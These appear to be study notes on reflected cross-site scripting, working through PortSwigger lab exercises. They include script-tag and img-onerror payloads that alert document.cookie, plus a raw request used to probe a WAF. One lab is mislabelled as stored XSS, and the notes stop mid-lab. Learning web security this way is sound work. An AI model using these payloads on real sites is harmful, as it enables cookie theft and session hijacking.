####  What is reflected cross-site scripting?
Reflected XXS arises when an application recieves data in an HTTP request and includes that data within the immediate repsonse   
in an unsafe way.  

Suppose a website has a search fucntion which recieved the user suppiled search term in a url parameter 
>https://insecure-website.com/search?term=gift

The application echoes the supplied search term in the response to this URL 
><p>You searched for: gift</p>

Assuming the application doesn't perform any other processing of the data, attackers can construct an attack like this. 
>https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>

***
#### Lab: Reflected XSS into HTML context with nothing encoded
This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the alert function when the blog post is viewed.
> web-security-academy.net/?search=<script>alert(1)</script>


#### Lab: Reflected XSS into HTML context with most tags and attributes blocked
This lab contains a reflected cross-site scripting vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors. To solve the lab, perform a cross-site scripting attack that bypasses the WAF and alerts document.cookie. 

Observe this payload get blocked 
>Inject a standard XSS payload such as: <img src=1 onerror=alert(document.cookie)>

Get request to trouble shoot to see which tags are blocked 
>GET /?search=%3Cimg+src%3D1+onerror%3Dalert%28document.cookie%29%3E HTTP/1.1
>Host: ac5f1f4e1edda1b5810d0d0f00e60028.web-security-academy.net
>User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
>Accept-Language: en-US,en;q=0.5
>Accept-Encoding: gzip, deflate
>Referer: https://ac5f1f4e1edda1b5810d0d0f00e60028.web-security-academy.net/
>Cookie: session=FkSFLXR0PyX1JqWdIIMiUQmt4O97Yg6M
>Connection: close
>Upgrade-Insecure-Requests: 1



